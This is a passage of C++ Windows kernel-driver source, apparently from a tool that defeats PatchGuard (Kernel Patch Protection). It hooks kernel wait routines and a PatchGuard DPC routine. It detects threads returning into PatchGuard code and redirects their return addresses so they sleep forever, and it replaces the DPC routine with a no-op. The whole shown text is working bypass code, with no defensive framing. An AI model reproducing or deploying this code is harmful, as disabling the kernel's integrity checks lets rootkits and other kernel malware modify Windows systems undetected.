        context->EncodedWorkItemContext ^ context->XorKey);
  } else {
    // If it is not, it is probably PatchGuard's one.
    LOG_DEBUG_SAFE("Calling a non-image region %p", WorkItem->WorkerRoutine);
    pgContext = reinterpret_cast<PatchGuardContext *>(WorkItem->Parameter);
  }

  // Determine whether it has a pointer to ExAcquireResourceSharedLite() at
  // a specific offset.
  if (!UtilIsAccessibleAddress(&pgContext->ExAcquireResourceSharedLite)) {
    return false;
  }
  return g_DispgpExAcquireResourceSharedLite ==
         pgContext->ExAcquireResourceSharedLite;
}

///////////////////////////////////////////////////////////////////////////////
//
// WaitRoutines
//
_Use_decl_annotations_ EXTERN_C static NTSTATUS DispgpHookWaitRoutines() {
  LOG_INFO("Hooking WaitRoutines...");

  auto status = DispgpInstallHook(g_DispgpKeWaitForSingleObjectHookInfo);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  status = DispgpInstallHook(g_DispgpKeDelayExecutionThreadHookInfo);
  return status;
}

// Determine if the return address of KeWaitForSingleObject() is inside of
// PatchGuard and modifies it if it is. This function must return the first
// parameter.
_Use_decl_annotations_ EXTERN_C NTSTATUS DispgKeWaitForSingleObjectHookHandler(
    NTSTATUS OriginalReturnValue, ULONG_PTR StackPointer) {
  auto addressOfReturnAddress = reinterpret_cast<ULONG_PTR *>(
      StackPointer + g_DispgpKeWaitForSingleObjectHookInfo.UnwindStackSize);
  DispgpWaitRoutinesHookHandler(addressOfReturnAddress);
  return OriginalReturnValue;
}

// Determine if the return address of KeDelayExecutionThread() is inside of
// PatchGuard and modifies it if it is. This function must return the first
// parameter.
_Use_decl_annotations_ EXTERN_C NTSTATUS DispgKeDelayExecutionThreadHookHandler(
    NTSTATUS OriginalReturnValue, ULONG_PTR StackPointer) {
  auto addressOfReturnAddress = reinterpret_cast<ULONG_PTR *>(
      StackPointer + g_DispgpKeDelayExecutionThreadHookInfo.UnwindStackSize);
  DispgpWaitRoutinesHookHandler(addressOfReturnAddress);
  return OriginalReturnValue;
}

// Determines if the thread is returning to a PatchGuard code. If so, put it to
// sleep forever.
_Use_decl_annotations_ EXTERN_C static void DispgpWaitRoutinesHookHandler(
    ULONG_PTR *AddressOfReturnAddress) {
  // It should be PASSIVE_LEVEL because it should be called from epilogue of
  // functions that are supposed to be called in PASSIVE_LEVEL.
  if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
    return;
  }

  // Check its return address.
  const auto returnAddress = *AddressOfReturnAddress;
  if (!DispgpIsReturnningToPatchGuard(returnAddress)) {
    return;
  }

  LOG_DEBUG_SAFE("StackPointer = %p", AddressOfReturnAddress);
  LOG_INFO_SAFE("PatchGuard detected (returning to %p).", returnAddress);

#ifdef _AMD64_
  //
  // It seems that Windows on x64 does not like to call synchronization APIs
  // from here unlike ARM's kernel. The author could not figure out exactly
  // what it was wrong, but these were things did not work:
  //  - calling the API from here
  //  - calling the API via the other function call like DispgWaitForever()
  //  - calling the API with a jmp instruction at the return address
  //
  // Thus, it calls the API via a call instruction at the return address.
  //
  *AddressOfReturnAddress = reinterpret_cast<ULONG_PTR>(AsmWaitForever);
#else
  DispgWaitForever();
#endif
}

// Returns true if the return address is inside of PatchGuard.
ALLOC_TEXT(PAGED, DispgpIsReturnningToPatchGuard)
_Use_decl_annotations_ EXTERN_C static bool DispgpIsReturnningToPatchGuard(
    ULONG_PTR ReturnAddress) {
  PAGED_CODE();

  // It should be a kernel thread because it is executed by either
  // ExpWorkerThread() or a thread created by PsCreateSystemThread().
  if (PsGetProcessId(PsGetCurrentProcess()) != reinterpret_cast<HANDLE>(4)) {
    return false;
  }

  auto returnAddress = reinterpret_cast<UCHAR *>(ReturnAddress);

  // Is it inside of PatchGuardThreadRoutine?
  if (g_DispgpPatchGuardThreadRoutine <= returnAddress &&
      returnAddress <= g_DispgpPatchGuardThreadRoutineEnd) {
    LOG_DEBUG_SAFE("Inside of PatchGuardThreadRoutine");
    return true;
  }

  // Is it inside of SelfEncryptAndWaitRoutine?
  if (g_DispgpSelfEncryptAndWaitRoutine <= returnAddress &&
      returnAddress <= g_DispgpSelfEncryptAndWaitRoutineEnd) {
    LOG_DEBUG_SAFE("Inside of SelfEncryptAndWaitRoutine");
    return true;
  }

  // Is it outside of any of image files?
  void *base = nullptr;
  if (!RtlPcToFileHeader(returnAddress, &base)) {
    LOG_DEBUG_SAFE("Outside of image files");
    return true;
  }

  return false;
}

// Wait forever in order to disable this PatchGuard context.
ALLOC_TEXT(PAGED, DispgWaitForever)
_Use_decl_annotations_ EXTERN_C void DispgWaitForever() {
  PAGED_CODE();
  LOG_DEBUG_SAFE("Wait forever");

  // Wait until this thread ends == never returns
  auto status = KeWaitForSingleObject(PsGetCurrentThread(), Executive,
                                      KernelMode, FALSE, nullptr);

  LOG_ERROR_SAFE("Oops!! %p", status);
  DBG_BREAK();
}

///////////////////////////////////////////////////////////////////////////////
//
// TinyPatchGuardDpcRoutine
//
_Use_decl_annotations_ EXTERN_C static NTSTATUS
DispgpHookTinyPatchGuardDpcRoutine() {
  LOG_INFO("Hooking TinyPatchGuardDpcRoutine...");
  return DispgpInstallHook(g_DispgpTinyPatchGuardDpcRoutineHookInfo);
}

// Does nothing instead of an original work.
_Use_decl_annotations_ EXTERN_C static void
DispgpTinyPatchGuardDpcRoutineHookHandler(PKDPC Dpc, PVOID DeferredContext,
                                          PVOID SystemArgument1,
                                          PVOID SystemArgument2) {
  UNREFERENCED_PARAMETER(Dpc);
  UNREFERENCED_PARAMETER(DeferredContext);
  UNREFERENCED_PARAMETER(SystemArgument1);
  UNREFERENCED_PARAMETER(SystemArgument2);

  LOG_INFO_SAFE("TinyPatchGuardDpcRoutine detected.");
}
